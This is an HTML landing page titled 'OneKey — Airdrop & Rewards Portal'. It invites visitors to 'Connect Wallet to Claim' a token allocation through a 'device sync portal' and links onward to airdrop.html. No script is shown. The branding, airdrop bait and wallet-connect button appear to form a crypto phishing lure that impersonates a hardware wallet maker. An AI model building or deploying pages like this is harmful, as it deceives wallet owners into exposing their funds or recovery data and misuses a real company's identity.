<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>OneKey — Airdrop &amp; Rewards Portal</title>
<style>
  :root {
    --bg: #0b0e13;
    --panel: #12161d;
    --panel-border: #232a35;
    --text: #e8ecf1;
    --muted: #8891a0;
    --accent: #3ddc84;
    --accent-dim: #1f7a4c;
  }
  * { box-sizing: border-box; }
  body {
    margin: 0;
    background: var(--bg);
    color: var(--text);
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
  }

  .wrap { max-width: 480px; width: 100%; padding: 20px; }

  .brand-row {
    display: flex;
    align-items: center;
    gap: 10px;
    justify-content: center;
    margin-bottom: 28px;
  }
  .brand-mark {
    width: 34px; height: 34px;
    border-radius: 8px;
    background: linear-gradient(135deg, var(--accent), var(--accent-dim));
    display: flex; align-items: center; justify-content: center;
    font-weight: 800; color: #06110b; font-size: 16px;
  }
  .brand-name { font-size: 18px; font-weight: 700; letter-spacing: 0.2px; }

  .card {
    background: var(--panel);
    border: 1px solid var(--panel-border);
    border-radius: 14px;
    padding: 32px 24px;
    box-shadow: 0 20px 60px -20px rgba(0, 0, 0, 0.55);
    text-align: center;
  }

  h1 {
    font-size: 22px;
    margin: 0 0 12px;
  }
  p.lede {
    color: var(--muted);
    font-size: 14px;
    line-height: 1.55;
    margin: 0 0 24px;
  }

  .action-btn {
    display: block;
    width: 100%;
    padding: 14px;
    border: 0;
    border-radius: 10px;
    background: var(--accent);
    color: #06170d;
    font-size: 15px;
    font-weight: 700;
    text-decoration: none;
    cursor: pointer;
    transition: filter 0.15s ease, transform 0.05s ease;
  }
  .action-btn:hover { filter: brightness(1.08); }
  .action-btn:active { transform: translateY(1px); }

  footer.note {
    margin-top: 24px;
    color: #55606f;
    font-size: 11px;
    line-height: 1.6;
    text-align: center;
  }
</style>
</head>
<body>

  <div class="wrap">
    <div class="brand-row">
      <div class="brand-mark">1K</div>
      <div class="brand-name">OneKey<span style="color:var(--muted); font-weight:400;"> — rewards</span></div>
    </div>

    <div class="card">
      <h1>Claim Your Rewards</h1>
      <p class="lede">
        Connect your wallet to check eligibility and claim your allocated token distribution securely through our device sync portal.
      </p>

      <a href="airdrop.html" class="action-btn">Connect Wallet to Claim</a>
    </div>

    <footer class="note">
      OneKey Hardware Wallet Integration Services. Secure device verification portal.
    </footer>
  </div>

</body>
</html>
